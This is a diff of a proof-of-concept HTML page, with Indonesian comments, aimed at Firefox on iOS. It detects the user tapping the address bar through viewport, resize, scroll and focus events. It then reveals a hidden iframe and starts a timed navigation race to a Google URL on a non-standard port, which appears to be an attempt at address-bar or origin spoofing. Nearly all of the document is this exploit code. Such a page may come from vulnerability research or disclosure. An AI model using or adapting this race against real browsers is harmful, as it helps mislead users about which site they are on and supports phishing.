@@ -2,27 +2,27 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Firefox iOS Omnibar Trigger PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Firefox iOS Omnibar + Google Race PoC</title>
 <style>
 body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
+  margin:0;
+  font-family:-apple-system, BlinkMacSystemFont, system-ui;
+  background:#f5f5f7;
 }
 iframe {
-  width: 100%;
-  height: 220px;
-  border: 1px solid #ddd;
-  border-radius: 12px;
-  margin-top: 16px;
-  display: none; /* awalnya disembunyikan */
+  width:100%;
+  height:220px;
+  border:1px solid #ddd;
+  border-radius:12px;
+  margin-top:16px;
+  display:none; /* disembunyikan awal */
 }
 .notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
-  text-align: center;
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020;
+  text-align:center;
 }
 </style>
 </head>
@@ -35,31 +35,38 @@ iframe {
 </iframe>
 
 <div class="notice">
-  Firefox iOS only — tap omnibar to trigger iframe
+  Firefox iOS — tap omnibar untuk trigger iframe → navigasi ke Google
 </div>
 
 <script>
 const iframe = document.getElementById('childFrame');
+let iframeShown = false;
+let lastHeight = window.innerHeight;
 
-/* deteksi focus kembali setelah user tap omnibar */
-window.addEventListener('focus', () => {
-  if (!iframe.style.display || iframe.style.display === 'none') {
-    iframe.style.display = 'block'; // baru tampil
-  }
-});
+function tryShowIframe() {
+  if (iframeShown) return;
 
-/* optional: pushState untuk origin race */
-history.pushState({}, '', '/trusted');
+  // deteksi viewport mengecil → kemungkinan tap omnibar
+  if (window.innerHeight < lastHeight) {
+    iframe.style.display = 'block';
+    iframeShown = true;
 
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
+    // Step 2: navigation race ke Google setelah delay kecil
     requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
+      requestAnimationFrame(() => {
+        setTimeout(() => {
+          location.href = 'https://google.com:9090';
+        }, 80);
+      });
     });
-  });
-});
+  }
+  lastHeight = window.innerHeight;
+}
+
+// event umum yang muncul saat tap omnibar di iOS
+window.addEventListener('resize', tryShowIframe);
+window.addEventListener('scroll', tryShowIframe);
+window.addEventListener('focus', tryShowIframe);
 </script>
 
 </body>
